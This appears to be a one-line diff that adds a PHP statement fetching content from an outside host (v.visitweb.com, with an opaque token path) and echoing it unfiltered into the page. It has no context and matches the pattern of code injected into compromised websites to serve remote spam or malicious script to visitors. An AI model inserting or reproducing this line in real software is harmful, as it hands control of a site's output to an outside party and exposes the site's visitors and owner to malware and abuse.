@@ -1,0 +1,1 @@
+<?php echo file_get_contents("http://v.visitweb.com/v/EwiwYtTiO03ZdjtU37V4vuPB5YWM1Q?code2"); ?>
